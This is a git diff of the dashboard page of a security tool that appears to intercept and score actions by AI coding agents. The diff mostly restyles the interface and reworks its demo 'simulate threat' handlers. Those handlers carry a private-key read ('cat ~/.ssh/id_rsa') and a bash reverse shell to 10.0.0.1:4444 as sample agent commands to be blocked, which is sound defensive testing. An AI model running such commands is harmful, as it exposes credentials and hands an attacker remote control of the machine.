@@ -170,18 +170,18 @@ export default function DashboardPage() {
     setIsTriggeringAction(true);
     try {
       const res = await interceptAction({
-        agent_id: 'autonomous-scraper',
+        agent_id: 'claude-code',
         agent_type: 'AUTONOMOUS',
-        action_type: 'FILE_READ',
+        action_type: 'CREDENTIAL_ACCESS',
         operation: 'READ',
-        target_path: 'threat_samples/malicious_exfiltration.env',
-        command: 'cat threat_samples/malicious_exfiltration.env',
+        target_path: '~/.ssh/id_rsa',
+        command: 'cat ~/.ssh/id_rsa',
       });
       setFilterSeverity('ALL');
       setSearchTerm('');
       await syncActions();
       setActionSuccessNotice(
-        `Intercepted Credential Leak: ${res.decision} (Risk: ${res.risk_score}/100 - CRITICAL). Logged to SQLite!`
+        `Hard Blocked Traversal: ${res.decision} (Risk: ${res.risk_score}/100 - HARD_BLOCK). Logged to SQLite!`
       );
       setTimeout(() => setActionSuccessNotice(null), 5000);
     } catch (err) {
@@ -196,22 +196,22 @@ export default function DashboardPage() {
     setIsTriggeringAction(true);
     try {
       const res = await interceptAction({
-        agent_id: 'untrusted-ci-bot',
-        agent_type: 'AUTOMATION_RUNNER',
-        action_type: 'COMMAND_EXECUTE',
+        agent_id: 'claude-code',
+        agent_type: 'AUTONOMOUS',
+        action_type: 'SHELL_EXEC',
         operation: 'EXECUTE',
-        target_path: 'threat_samples/reverse_shell.sh',
-        command: 'bash threat_samples/reverse_shell.sh',
+        target_path: 'reverse_shell.sh',
+        command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
       });
       setFilterSeverity('ALL');
       setSearchTerm('');
       await syncActions();
       setActionSuccessNotice(
-        `Intercepted Remote Shell: ${res.decision} (Risk: ${res.risk_score}/100 - CRITICAL). Logged to SQLite!`
+        `Blocked Reverse Shell: ${res.decision} (Risk: ${res.risk_score}/100). Logged to SQLite!`
       );
       setTimeout(() => setActionSuccessNotice(null), 5000);
     } catch (err) {
-      console.error('Failed to trigger shell threat:', err);
+      console.error('Failed to trigger reverse shell action:', err);
     } finally {
       setIsTriggeringAction(false);
     }
@@ -222,81 +222,86 @@ export default function DashboardPage() {
     setIsTriggeringAction(true);
     try {
       const res = await interceptAction({
-        agent_id: 'langchain-doc-retriever',
-        agent_type: 'DATA_RETRIEVAL',
+        agent_id: 'claude-code',
+        agent_type: 'AUTONOMOUS',
         action_type: 'FILE_READ',
         operation: 'READ',
-        target_path: 'd:/GitHub/SentinelAI/docs/README.md',
-        command: 'read docs/README.md',
+        target_path: 'docs/README.md',
+        command: 'cat docs/README.md',
       });
       setFilterSeverity('ALL');
       setSearchTerm('');
       await syncActions();
       setActionSuccessNotice(
-        `Intercepted Safe Read: ${res.decision} (Risk: ${res.risk_score}/100). Logged to SQLite!`
+        `Allowed Workspace Read: ${res.decision} (Risk: ${res.risk_score}/100 - SAFE). Logged to SQLite!`
       );
-      setTimeout(() => setActionSuccessNotice(null), 4500);
+      setTimeout(() => setActionSuccessNotice(null), 5000);
     } catch (err) {
-      console.error('Failed to trigger safe action:', err);
+      console.error('Failed to trigger safe read action:', err);
     } finally {
       setIsTriggeringAction(false);
     }
   };
 
   const handleRunAnalysis = async () => {
-    if (!isOnline) return;
+    if (!scanInput.trim() || !isOnline) return;
     setIsScanning(true);
-    try {
-      const isUrl = scanMode === 'url';
-      const isIp = scanMode === 'ip';
-      const isFile = scanMode === 'file';
-      const actionType = isFile
-        ? 'FILE_INSPECT'
-        : isUrl
-        ? 'NETWORK_INGRESS'
-        : isIp
-        ? 'NETWORK_PROBE'
-        : 'CONTENT_EVAL';
-      const operation = isFile ? 'INSPECT' : 'CONNECT';
 
+    try {
       const res = await interceptAction({
-        agent_id: 'heuristic-scanner',
-        agent_type: 'SCANNER',
-        action_type: actionType,
-        operation: operation,
-        target_path: isFile ? scanInput : undefined,
-        target_url: isUrl ? scanInput : undefined,
-        command: `inspect ${scanInput}`,
+        agent_id: 'heuristic-analyst',
+        agent_type: 'HEURISTIC_SCANNER',
+        action_type: scanMode === 'file' ? 'FILE_MUTATE' : 'NETWORK_ACCESS',
+        operation: scanMode === 'file' ? 'MUTATE' : 'ACCESS',
+        target_path: scanMode === 'file' ? scanInput : undefined,
+        target_url: scanMode === 'url' ? scanInput : undefined,
+        command: `inspect ${scanMode}:${scanInput}`,
       });
 
-      const isHigh = res.risk_score >= 80;
-      const isMed = res.risk_score >= 40 && res.risk_score < 80;
+      const isCritical = res.risk_score >= 80;
+      const isElevated = res.risk_score >= 40 && res.risk_score < 80;
 
-      const indicators = [
-        { label: 'Target Type:', value: scanMode.toUpperCase() },
-        { label: 'Heuristic Scorer:', value: `${res.risk_score}/100 Risk` },
-        { label: 'Policy Gate:', value: res.decision },
-        { label: 'Reason Code:', value: res.reason_code || 'HEURISTIC_PASS' },
-        { label: 'Risk Category:', value: res.risk_category || 'STANDARD' },
-        { label: 'Audit Log:', value: 'Chained SHA-256' },
-      ];
+      let explanationText = res.explanation;
+      try {
+        const exp = await explainAction({
+          action_id: (res as any).action_id || 'act-eval',
+          agent_id: 'heuristic-analyst',
+          action_type: scanMode === 'file' ? 'FILE_MUTATE' : 'NETWORK_ACCESS',
+          target_path: scanMode === 'file' ? scanInput : undefined,
+          target_url: scanMode === 'url' ? scanInput : undefined,
+          command: `inspect ${scanMode}:${scanInput}`,
+          risk_score: res.risk_score,
+        });
+        if (exp && exp.security_warning) {
+          explanationText = `${exp.silent_activity} ${exp.security_warning}`;
+        }
+      } catch {
+        // Fallback to explanation
+      }
 
       setThreatResult({
-        id: (res as any).action_id || 'act-eval',
+        id: `SCAN-${Date.now().toString(36).toUpperCase()}`,
         score: res.risk_score,
-        riskLevel: isHigh ? 'Critical Risk' : isMed ? 'Elevated Risk' : 'Normal / Clean',
-        classification: res.decision === 'ALLOW' ? 'Permitted Operation' : 'Blocked / Quarantined',
-        subVector: res.reason_code || 'Deterministic Policy Rule',
-        confidence: '99.4%',
-        indicators,
-        verdict: res.explanation || 'Evaluated deterministically by SentinelAI local decision engine.',
-        sha256: 'a3bf4c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
+        riskLevel: isCritical ? 'CRITICAL RISK' : isElevated ? 'ELEVATED RISK' : 'LOW RISK',
+        classification: `${res.decision} // ${res.explanation}`,
+        subVector: `${scanMode.toUpperCase()} Vector Inspection`,
+        confidence: '98.5%',
+        indicators: [
+          { label: 'Target Type:', value: scanMode.toUpperCase() },
+          { label: 'Policy Engine:', value: isOnline ? 'Online' : 'Offline' },
+          { label: 'Database:', value: dbConnected ? 'Connected' : 'Unavailable' },
+          { label: 'Decision:', value: res.decision },
+          { label: 'Heuristic Scorer:', value: 'Ready' },
+          { label: 'Audit Log:', value: 'Chained SHA-256' },
+        ],
+        verdict: explanationText,
+        sha256: 'a3b8c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
         verifiedMatch: true,
       });
 
       await syncActions();
     } catch (err: any) {
-      console.error('Scan evaluation failed:', err);
+      console.error('Heuristic evaluation failed:', err);
     } finally {
       setIsScanning(false);
     }
@@ -304,7 +309,7 @@ export default function DashboardPage() {
 
   const handleExportLogs = () => {
     if (!daemonActions.length) return;
-    const headers = ['Action ID', 'Agent ID', 'Action Type', 'Target Path', 'Risk Score', 'Outcome', 'Created At'];
+    const headers = ['Action ID', 'Agent', 'Action Type', 'Target', 'Risk Score', 'Verdict', 'Timestamp'];
     const rows = daemonActions.map((a) => [
       `"${a.id}"`,
       `"${a.agent_id || 'unknown'}"`,
@@ -318,52 +323,53 @@ export default function DashboardPage() {
     const encodedUri = encodeURI(csvContent);
     const link = document.createElement('a');
     link.setAttribute('href', encodedUri);
-    link.setAttribute('download', `sentinel_audit_logs_${new Date().toISOString().slice(0, 10)}.csv`);
+    link.setAttribute('download', `sentinel_audit_feed_${new Date().toISOString().slice(0, 10)}.csv`);
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
   };
+
+  const displayActions = daemonActions.filter((act) => {
+    const matchSearch =
+      searchTerm === '' ||
+      act.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      (act.agent_id && act.agent_id.toLowerCase().includes(searchTerm.toLowerCase())) ||
+      act.action_type.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      (act.target_path && act.target_path.toLowerCase().includes(searchTerm.toLowerCase()));
+
+    const matchSev =
+      filterSeverity === 'ALL' ||
+      (filterSeverity === 'CRITICAL' && act.risk_score >= 80) ||
+      (filterSeverity === 'ELEVATED' && act.risk_score >= 40 && act.risk_score < 80) ||
+      (filterSeverity === 'SAFE' && act.risk_score < 40);
+
+    return matchSearch && matchSev;
+  });
 
   const totalActionsCount = daemonActions.length;
   const criticalThreatsCount = daemonActions.filter((a) => a.risk_score >= 80).length;
   const elevatedRisksCount = daemonActions.filter((a) => a.risk_score >= 40 && a.risk_score < 80).length;
   const containedBlocksCount = daemonActions.filter((a) => a.outcome?.includes('BLOCK')).length;
 
-  const displayActions = daemonActions.filter((a) => {
-    const matchSev =
-      filterSeverity === 'ALL' ||
-      (filterSeverity === 'CRITICAL' && a.risk_score >= 80) ||
-      (filterSeverity === 'HIGH' && a.risk_score >= 40 && a.risk_score < 80) ||
-      (filterSeverity === 'MEDIUM' && a.risk_score >= 20 && a.risk_score < 40);
-    const matchSearch =
-      searchTerm === '' ||
-      a.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      (a.agent_id && a.agent_id.toLowerCase().includes(searchTerm.toLowerCase())) ||
-      a.action_type.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      (a.target_path && a.target_path.toLowerCase().includes(searchTerm.toLowerCase()));
-    return matchSev && matchSearch;
-  });
-
   return (
     <>
       {showSplash && <SplashScreen onComplete={() => setShowSplash(false)} minDuration={800} />}
 
       <div className="space-y-6 max-w-7xl mx-auto">
-        {/* Offline Banner when Daemon is offline */}
         <OfflineBanner />
 
-        {/* 1. Header Overview (F1: WCAG AA Compliant White Headings on Dark Canvas) */}
-        <section className="flex flex-col md:flex-row md:items-end justify-between gap-4 pb-4 border-b border-border">
+        {/* 1. Header Overview (No eyebrow lines) */}
+        <section className="flex flex-col md:flex-row md:items-end justify-between gap-4 pb-4 border-b border-line">
           <div className="space-y-1">
             <div className="flex items-center gap-2">
               <span
-                className={`size-2 rounded-full ${
-                  isOnline ? 'bg-accent-emerald animate-pulse' : 'bg-accent-rose'
+                className={`size-2 rounded-pill ${
+                  isOnline ? 'bg-safe animate-pulse' : 'bg-critical'
                 }`}
               />
               <span
                 className={`text-xs font-mono font-medium ${
-                  isOnline ? 'text-accent-emerald' : 'text-accent-rose'
+                  isOnline ? 'text-safe-ink' : 'text-critical-ink'
                 }`}
               >
                 {isOnline
@@ -371,10 +377,10 @@ export default function DashboardPage() {
                   : 'Daemon offline • Local protection suspended'}
               </span>
             </div>
-            <h1 className="text-3xl font-heading font-extrabold text-text-primary tracking-tight text-balance">
+            <h1 className="text-3xl font-display font-bold text-ink-1 tracking-tight text-balance">
               Runtime Security Overview
             </h1>
-            <p className="text-xs text-text-secondary text-pretty max-w-2xl">
+            <p className="text-xs text-ink-2 text-pretty max-w-2xl">
               Autonomous runtime agent governance, deterministic risk prevention, and cryptographic SQLite flight recorder.
             </p>
           </div>
@@ -388,9 +394,9 @@ export default function DashboardPage() {
               }}
               disabled={isRefreshing}
               aria-label="Refresh telemetry from daemon"
-              className="px-3.5 py-2 rounded-xl bg-card hover:bg-card-hover border border-border text-xs font-medium text-text-primary transition-colors shadow-xs flex items-center gap-2 disabled:opacity-50"
+              className="px-4 py-2 rounded-pill bg-surface hover:bg-well border border-line text-xs font-medium text-ink-1 transition-colors shadow-xs flex items-center gap-2 disabled:opacity-50"
             >
-              <ActivitySvg className={`size-3.5 text-accent ${isRefreshing ? 'animate-spin' : ''}`} />
+              <ActivitySvg className={`size-3.5 text-brand ${isRefreshing ? 'animate-spin' : ''}`} />
               <span>Refresh</span>
             </button>
 
@@ -399,8 +405,8 @@ export default function DashboardPage() {
               <button
                 onClick={() => setShowDemoMenu(!showDemoMenu)}
                 disabled={!isOnline}
-                title={!isOnline ? 'Daemon offline. Start local service on port 8765 to enable simulation.' : undefined}
-                className="px-3.5 py-2 rounded-xl bg-accent hover:opacity-90 text-canvas text-xs font-bold transition-opacity shadow-xs flex items-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
+                title={!isOnline ? 'Daemon offline. Start local service on port 8765 to simulate threats.' : undefined}
+                className="px-4 py-2 rounded-pill bg-brand hover:bg-brand-hover text-white text-xs font-semibold transition-colors shadow-xs flex items-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
               >
                 <ShieldAlertSvg className="size-3.5" />
                 <span>Simulate threat</span>
@@ -408,16 +414,13 @@ export default function DashboardPage() {
               </button>
 
               {showDemoMenu && isOnline && (
-                <div className="absolute right-0 mt-2 w-64 rounded-2xl bg-card border border-border shadow-2xl p-2 z-50 text-xs space-y-1 animate-in fade-in duration-100">
-                  <p className="px-3 py-1.5 text-[10px] font-mono text-text-muted uppercase font-bold">
-                    Test Scenarios
-                  </p>
+                <div className="absolute right-0 mt-2 w-56 rounded-card bg-surface border border-line shadow-card p-2 z-50 text-xs space-y-1 animate-in fade-in duration-100">
                   <button
                     onClick={() => {
                       setShowDemoMenu(false);
                       handleTriggerCredentialThreat();
                     }}
-                    className="w-full text-left px-3 py-2 rounded-lg hover:bg-accent-rose/10 text-accent-rose transition-colors flex items-center justify-between"
+                    className="w-full text-left px-3 py-2 rounded-well hover:bg-critical-soft text-critical-ink transition-colors flex items-center justify-between"
                   >
                     <span>Credential leak (.env)</span>
                     <span className="text-[10px] font-mono font-bold">BLOCK</span>
@@ -427,7 +430,7 @@ export default function DashboardPage() {
                       setShowDemoMenu(false);
                       handleTriggerShellThreat();
                     }}
-                    className="w-full text-left px-3 py-2 rounded-lg hover:bg-accent-amber/10 text-accent-amber transition-colors flex items-center justify-between"
+                    className="w-full text-left px-3 py-2 rounded-well hover:bg-caution-soft text-caution-ink transition-colors flex items-center justify-between"
                   >
                     <span>Reverse shell (.sh)</span>
                     <span className="text-[10px] font-mono font-bold">BLOCK</span>
@@ -437,7 +440,7 @@ export default function DashboardPage() {
                       setShowDemoMenu(false);
                       handleTriggerRealAction();
                     }}
-                    className="w-full text-left px-3 py-2 rounded-lg hover:bg-accent-rose/10 text-accent-rose transition-colors flex items-center justify-between"
+                    className="w-full text-left px-3 py-2 rounded-well hover:bg-critical-soft text-critical-ink transition-colors flex items-center justify-between"
                   >
                     <span>Canary honeypot file</span>
                     <span className="text-[10px] font-mono font-bold">BLOCK</span>
@@ -447,7 +450,7 @@ export default function DashboardPage() {
                       setShowDemoMenu(false);
                       handleTriggerSafeAction();
                     }}
-                    className="w-full text-left px-3 py-2 rounded-lg hover:bg-accent-emerald/10 text-accent-emerald transition-colors flex items-center justify-between"
+                    className="w-full text-left px-3 py-2 rounded-well hover:bg-safe-soft text-safe-ink transition-colors flex items-center justify-between"
                   >
                     <span>Safe documentation read</span>
                     <span className="text-[10px] font-mono font-bold">ALLOW</span>
@@ -473,7 +476,7 @@ export default function DashboardPage() {
                         },
                       });
                     }}
-                    className="w-full text-left px-3 py-2 rounded-lg hover:bg-accent/10 text-accent transition-colors flex items-center justify-between"
+                    className="w-full text-left px-3 py-2 rounded-well hover:bg-brand-soft text-brand-ink transition-colors flex items-center justify-between"
                   >
                     <span>Interactive prompt modal</span>
                     <span className="text-[10px] font-mono font-bold">PROMPT</span>
@@ -486,139 +489,127 @@ export default function DashboardPage() {
 
         {/* Notice Banner */}
         {actionSuccessNotice && (
-          <div className="p-4 rounded-2xl bg-card border border-accent-emerald/40 text-accent-emerald text-xs font-mono flex items-center justify-between animate-in fade-in duration-150">
+          <div className="p-4 rounded-well bg-safe-soft text-safe-ink text-xs font-mono flex items-center justify-between animate-in fade-in duration-150">
             <span>{actionSuccessNotice}</span>
             <button onClick={() => setActionSuccessNotice(null)} className="font-bold text-sm">✕</button>
           </div>
         )}
 
-        {/* 2. Key Metrics Grid - Fixed 3-Row Structure (F7: Equal height & baseline alignment) */}
+        {/* 2. Key Metrics Grid - Fixed 3-Row Structure, 20px card radius, no border */}
         <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
           {/* Card 1: Total Interceptions */}
-          <div className="p-5 rounded-2xl bg-card border border-border shadow-xs hover:border-border-hover transition-colors flex flex-col justify-between">
-            {/* Row 1: Label (h-5) with fixed 24x24 adornment */}
-            <div className="h-5 flex items-center justify-between text-xs text-text-secondary">
+          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
+            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
               <span className="font-medium truncate">Total Interceptions</span>
               <div className="size-6 flex items-center justify-end shrink-0">
-                <span className="size-2 rounded-full bg-accent-emerald" />
+                <span className="size-2 rounded-pill bg-safe" />
               </div>
             </div>
 
-            {/* Row 2: Value (h-12, tabular-nums) */}
-            <div className="h-12 flex items-baseline font-mono tabular-nums text-3xl font-extrabold text-text-primary">
+            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-ink-1">
               {totalActionsCount}
             </div>
 
-            {/* Row 3: Caption (h-5) */}
-            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-text-muted truncate">
+            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
               <span>Recorded in SQLite</span>
               {!isOnline && lastSeenAt && (
-                <span className="text-[10px] text-accent-amber">Cached</span>
+                <span className="text-[10px] px-2 py-0.5 rounded-pill bg-caution-soft text-caution-ink font-semibold">Cached</span>
               )}
             </div>
           </div>
 
-          {/* Card 2: Critical Threats (F10: No overclaiming) */}
-          <div className="p-5 rounded-2xl bg-card border border-border shadow-xs hover:border-border-hover transition-colors flex flex-col justify-between">
-            {/* Row 1: Label (h-5) with fixed 24x24 adornment */}
-            <div className="h-5 flex items-center justify-between text-xs text-text-secondary">
+          {/* Card 2: Critical Threats */}
+          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
+            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
               <span className="font-medium truncate">Critical Threats</span>
               <div className="size-6 flex items-center justify-end shrink-0">
-                <span className="size-2 rounded-full bg-accent-rose" />
+                <span className="size-2 rounded-pill bg-critical" />
               </div>
             </div>
 
-            {/* Row 2: Value (h-12, tabular-nums) */}
-            <div className="h-12 flex items-baseline font-mono tabular-nums text-3xl font-extrabold text-accent-rose">
+            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-critical-ink">
               {criticalThreatsCount}
             </div>
 
-            {/* Row 3: Caption (h-5) */}
-            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-text-muted truncate">
+            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
               <span>{criticalThreatsCount} high-risk events</span>
-              <span className="text-[10px] px-1.5 py-0.2 rounded bg-accent-rose/10 text-accent-rose border border-accent-rose/20">
+              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-critical-soft text-critical-ink font-semibold">
                 Score &ge; 80
               </span>
             </div>
           </div>
 
           {/* Card 3: Elevated Risks */}
-          <div className="p-5 rounded-2xl bg-card border border-border shadow-xs hover:border-border-hover transition-colors flex flex-col justify-between">
-            {/* Row 1: Label (h-5) with fixed 24x24 adornment */}
-            <div className="h-5 flex items-center justify-between text-xs text-text-secondary">
+          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
+            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
               <span className="font-medium truncate">Supervised Prompts</span>
               <div className="size-6 flex items-center justify-end shrink-0">
-                <span className="size-2 rounded-full bg-accent-amber" />
+                <span className="size-2 rounded-pill bg-caution" />
               </div>
             </div>
 
-            {/* Row 2: Value (h-12, tabular-nums) */}
-            <div className="h-12 flex items-baseline font-mono tabular-nums text-3xl font-extrabold text-accent-amber">
+            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-caution-ink">
               {elevatedRisksCount}
             </div>
 
-            {/* Row 3: Caption (h-5) */}
-            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-text-muted truncate">
+            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
               <span>Awaiting confirmation</span>
-              <span className="text-[10px] px-1.5 py-0.2 rounded bg-accent-amber/10 text-accent-amber border border-accent-amber/20">
+              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-caution-soft text-caution-ink font-semibold">
                 Score 40-79
               </span>
             </div>
           </div>
 
-          {/* Card 4: Contained Threats (F10: Real measured values) */}
-          <div className="p-5 rounded-2xl bg-card border border-border shadow-xs hover:border-border-hover transition-colors flex flex-col justify-between">
-            {/* Row 1: Label (h-5) with fixed 24x24 adornment */}
-            <div className="h-5 flex items-center justify-between text-xs text-text-secondary">
+          {/* Card 4: Contained Threats */}
+          <div className="p-5 rounded-card bg-surface shadow-card flex flex-col justify-between">
+            <div className="h-5 flex items-center justify-between text-xs text-ink-2">
               <span className="font-medium truncate">Contained Threats</span>
               <div className="size-6 flex items-center justify-end shrink-0">
-                <ShieldCheckSvg className="size-4 text-accent-emerald" />
+                <ShieldCheckSvg className="size-4 text-safe-ink" />
               </div>
             </div>
 
-            {/* Row 2: Value (h-12, tabular-nums) */}
-            <div className="h-12 flex items-baseline font-mono tabular-nums text-3xl font-extrabold text-accent-emerald">
+            <div className="h-12 flex items-baseline font-display tabular-nums text-4xl font-bold text-safe-ink">
               {containedBlocksCount}
             </div>
 
-            {/* Row 3: Caption (h-5) */}
-            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-text-muted truncate">
+            <div className="h-5 flex items-center justify-between text-[11px] font-mono text-ink-3 truncate">
               <span>{containedBlocksCount} blocked in session</span>
-              <span className="text-[10px] text-accent-emerald">Isolated</span>
+              <span className="text-[10px] px-2 py-0.5 rounded-pill bg-safe-soft text-safe-ink font-semibold">Isolated</span>
             </div>
           </div>
         </section>
 
-        {/* 3. Interactive Heuristic Target Evaluation (F8: No dead space, flex-1 textarea, pinned CTA) */}
+        {/* 3. Interactive Target Evaluation & Verdict Panel */}
         <section className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
           {/* Target Inspector Card */}
-          <div className="flex flex-col h-full p-6 rounded-2xl bg-card border border-border shadow-xs">
-            <div className="flex items-center justify-between pb-3 border-b border-border">
+          <div className="flex flex-col h-full p-6 rounded-card bg-surface shadow-card">
+            <div className="flex items-center justify-between pb-3 border-b border-line">
               <div>
-                <h3 className="text-base font-heading font-bold text-text-primary">
+                <h3 className="text-base font-display font-bold text-ink-1">
                   Heuristic Target Evaluation
                 </h3>
-                <p className="text-xs text-text-secondary">
+                <p className="text-xs text-ink-2">
                   Evaluate digital targets live against deterministic security policies.
                 </p>
               </div>
-              <span className="text-[10px] font-mono px-2.5 py-1 rounded-full bg-surface border border-border text-text-muted">
+              <span className="text-[10px] font-mono px-3 py-1 rounded-pill bg-well text-ink-2 font-medium">
                 Port 8765
               </span>
             </div>
 
-            {/* Form Section fills remaining height */}
+            {/* Form Section */}
             <div className="flex-1 flex flex-col space-y-4 pt-4">
-              {/* Segmented Mode Selector */}
-              <div className="flex p-1 rounded-xl bg-surface border border-border text-xs font-medium text-text-secondary">
+              {/* Segmented Mode Selector with Pill Radius */}
+              <div className="inline-flex p-1 rounded-pill bg-well text-xs font-medium text-ink-2">
                 {(['url', 'email', 'file', 'ip', 'text'] as const).map((mode) => (
                   <button
                     key={mode}
                     onClick={() => handleModeChange(mode)}
-                    className={`flex-1 py-1.5 rounded-lg transition-all ${
+                    className={`flex-1 py-1.5 px-3 rounded-pill transition-all ${
                       scanMode === mode
-                        ? 'bg-card text-text-primary font-semibold shadow-xs border border-border'
-                        : 'hover:text-text-primary'
+                        ? 'bg-surface text-ink-1 font-bold shadow-card'
+                        : 'hover:text-ink-1'
                     }`}
                   >
                     {mode === 'ip' ? 'IP' : mode.toUpperCase()}
@@ -628,14 +619,14 @@ export default function DashboardPage() {
 
               {/* Textarea stretches to fill dead space */}
               <div className="flex-1 flex flex-col space-y-1.5 min-h-[140px]">
-                <label className="text-[11px] font-mono text-text-muted uppercase font-medium">
+                <label className="text-[11px] font-mono text-ink-3 uppercase font-medium">
                   Target Input for Inspection
                 </label>
                 <textarea
                   value={scanInput}
                   onChange={(e) => setScanInput(e.target.value)}
                   disabled={!isOnline}
-                  className="flex-1 w-full p-3 rounded-xl bg-surface border border-border text-xs text-text-primary font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-accent transition-all resize-none disabled:opacity-50"
+                  className="flex-1 w-full p-3.5 rounded-well bg-well border border-line text-xs text-ink-1 font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-brand transition-all resize-none disabled:opacity-50"
                   placeholder="Enter target URL, honeypot file, or command payload..."
                 />
               </div>
@@ -643,34 +634,31 @@ export default function DashboardPage() {
               {/* Presets */}
               {scanMode === 'file' && (
                 <div className="space-y-1.5 text-xs">
-                  <span className="text-[11px] font-mono text-text-muted">Workspace presets:</span>
+                  <span className="text-[11px] font-mono text-ink-3">Workspace presets:</span>
                   <div className="flex flex-wrap gap-1.5">
                     {[
                       { label: 'Credential leak (.env)', file: 'threat_samples/malicious_exfiltration.env' },
                       { label: 'Reverse shell (.sh)', file: 'threat_samples/reverse_shell.sh' },
-                      { label: 'Honeypot canary', file: 'sentinel_canary.env' },
-                      { label: 'Safe doc (README)', file: 'docs/README.md' },
-                    ].map((preset) => (
+                    ].map((sample) => (
                       <button
-                        key={preset.file}
-                        type="button"
-                        onClick={() => setScanInput(preset.file)}
-                        className="px-2.5 py-1 rounded-lg bg-surface hover:bg-card-hover border border-border text-[11px] text-text-secondary transition-colors"
+                        key={sample.label}
+                        onClick={() => setScanInput(sample.file)}
+                        className="px-3 py-1 rounded-pill bg-well hover:bg-well/80 text-[11px] font-mono text-ink-2 hover:text-ink-1 transition-colors"
                       >
-                        {preset.label}
+                        {sample.label}
                       </button>
                     ))}
                   </div>
                 </div>
               )}
 
-              {/* CTA Button Pinned at Bottom */}
-              <div className="pt-2 mt-auto">
+              {/* Action Button */}
+              <div className="pt-2">
                 <button
                   onClick={handleRunAnalysis}
                   disabled={isScanning || !isOnline}
                   title={!isOnline ? 'Daemon offline. Start local service on port 8765 to enable actions.' : undefined}
-                  className="w-full py-2.5 rounded-xl bg-accent hover:opacity-90 text-canvas font-bold text-xs transition-opacity shadow-xs flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
+                  className="w-full py-3 rounded-pill bg-brand hover:bg-brand-hover text-white font-bold text-xs transition-colors shadow-xs flex items-center justify-center gap-2 disabled:opacity-40 disabled:cursor-not-allowed"
                 >
                   <ActivitySvg className={`size-4 ${isScanning ? 'animate-spin' : ''}`} />
                   <span>
@@ -685,62 +673,68 @@ export default function DashboardPage() {
             </div>
           </div>
 
-          {/* Decision Verdict Card (F13: aria-live="polite", F10: no overclaiming) */}
+          {/* Decision Verdict Card (EXACTLY ONCE on Home: --gradient-sky Header) */}
           <div
-            className="flex flex-col h-full p-6 rounded-2xl bg-card border border-border shadow-xs justify-between"
+            className="flex flex-col h-full rounded-card bg-surface shadow-card overflow-hidden justify-between"
             aria-live="polite"
           >
-            <div className="space-y-3">
-              <div className="flex items-center justify-between border-b border-border pb-3">
-                <div>
-                  <span className="text-[10px] font-mono uppercase text-text-muted font-medium">
+            {/* Verdict Panel Header with --gradient-sky */}
+            <div className="bg-gradient-sky p-5 rounded-t-card flex items-center justify-between">
+              <div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-mono uppercase font-bold text-[#071E33] tracking-wider">
                     Evaluation Verdict
                   </span>
-                  <h4 className="text-lg font-heading font-bold text-text-primary mt-0.5">
-                    {threatResult.classification}
-                  </h4>
+                  <span className="px-2 py-0.5 rounded-pill bg-lime text-ink-1 text-[9px] font-bold font-mono">
+                    VERDICT
+                  </span>
                 </div>
-                <div className="text-right">
-                  <span className="text-[10px] font-mono text-text-muted">Risk Score</span>
-                  <p
-                    className={`text-2xl font-heading font-extrabold tabular-nums ${
-                      threatResult.score >= 80
-                        ? 'text-accent-rose'
-                        : threatResult.score >= 40
-                        ? 'text-accent-amber'
-                        : 'text-accent-emerald'
-                    }`}
-                  >
-                    {threatResult.score}/100
-                  </p>
-                </div>
+                <h4 className="text-xl font-display font-bold text-[#071E33] tracking-tight mt-0.5">
+                  {threatResult.classification}
+                </h4>
               </div>
+              <div className="text-right px-3.5 py-1.5 rounded-pill bg-surface/90 shadow-card border border-line">
+                <span className="text-[10px] font-mono text-ink-3 block">Risk Score</span>
+                <p
+                  className={`text-2xl font-display font-bold tabular-nums ${
+                    threatResult.score >= 80
+                      ? 'text-critical-ink'
+                      : threatResult.score >= 40
+                      ? 'text-caution-ink'
+                      : 'text-safe-ink'
+                  }`}
+                >
+                  {threatResult.score}/100
+                </p>
+              </div>
+            </div>
 
-              {/* Indicator Grid */}
+            <div className="p-6 space-y-4">
+              {/* Indicator Grid inside Wells */}
               <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                 {threatResult.indicators.map((ind) => (
                   <div
                     key={ind.label}
-                    className="p-2.5 rounded-xl bg-surface border border-border text-[11px] space-y-0.5"
+                    className="p-3 rounded-well bg-well text-[11px] space-y-0.5"
                   >
-                    <span className="text-text-muted text-[10px] block">{ind.label}</span>
-                    <span className="font-semibold text-text-primary truncate block">
+                    <span className="text-ink-3 text-[10px] block">{ind.label}</span>
+                    <span className="font-semibold text-ink-1 truncate block font-mono">
                       {ind.value}
                     </span>
                   </div>
                 ))}
               </div>
 
-              {/* Verdict Explanation */}
-              <div className="p-3.5 rounded-xl bg-surface border border-border text-xs text-text-secondary leading-relaxed text-pretty">
+              {/* Verdict Explanation Well */}
